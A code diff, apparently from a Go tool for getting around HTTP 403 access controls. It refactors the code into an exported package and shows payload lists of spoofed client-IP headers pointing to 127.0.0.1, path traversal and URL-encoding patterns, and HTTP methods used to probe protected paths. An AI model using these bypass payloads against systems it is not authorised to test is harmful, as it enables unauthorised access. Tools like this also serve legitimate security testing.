@@ -1,11 +1,11 @@
-package main
+package bypass
 
 import (
 	"fmt"
 	"strings"
 )
 
-var bypassHeaders = []map[string][]string{
+var BypassHeaders = []map[string][]string{
 	{"Client-IP": {"127.0.0.1"}},
 	{"Forwarded-For-Ip": {"127.0.0.1"}},
 	{"Forwarded-For": {"127.0.0.1"}},
@@ -40,7 +40,7 @@ var bypassHeaders = []map[string][]string{
 	{"X-Remote-IP": {"127.0.0.1"}},
 }
 
-var pathBypassPatterns = []string{
+var PathBypassPatterns = []string{
 	"%s/./%s",
 	"%s/../%s",
 	"%s/%%2e/%s",
@@ -54,7 +54,7 @@ var pathBypassPatterns = []string{
 	"%s/./%s/..",
 }
 
-var httpMethods = [9]string{
+var HttpMethods = [9]string{
 	"GET",
 	"POST",
 	"PUT",
@@ -66,13 +66,13 @@ var httpMethods = [9]string{
 	"TRACE",
 }
 
-func generateBypassPaths(url string, path string) []string {
+func GenerateBypassPaths(url string, path string) []string {
 
 	var bypassPaths []string
 
 	bypassPaths = append(bypassPaths, fmt.Sprintf("%s/%s", url, strings.ToUpper(path)))
 
-	for _, pattern := range pathBypassPatterns {
+	for _, pattern := range PathBypassPatterns {
 		bypassPaths = append(bypassPaths, fmt.Sprintf(pattern, url, path))
 	}
 	return bypassPaths
